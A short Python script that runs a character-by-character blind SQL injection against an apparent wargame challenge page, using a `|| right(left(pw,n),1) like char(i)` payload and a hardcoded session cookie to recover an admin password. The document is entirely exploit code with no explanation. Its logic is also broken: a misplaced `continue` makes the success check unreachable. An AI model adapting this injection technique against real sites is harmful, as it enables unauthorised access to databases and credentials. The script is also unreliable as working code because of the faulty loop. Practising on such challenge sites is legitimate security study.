import urllib,requests


password=""


for j in range(1,9): 
    for i in range(48,128):
        try:
            url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=%27%20||%20right(left(pw," + str(j) + "),1)" +"%20like%20char("+ str(i) +")%23"
            r = requests.post(url,cookies=(dict(PHPSESSID="t3lssqi3a9enhffi1mac5amc65")))
            print(url)
        except:
            print("Error")
        continue
        if 'Hello admin' in r.text: 
            password = password + chr(i)
            print ("[+] PW " + str(j) + " : " + password)
            break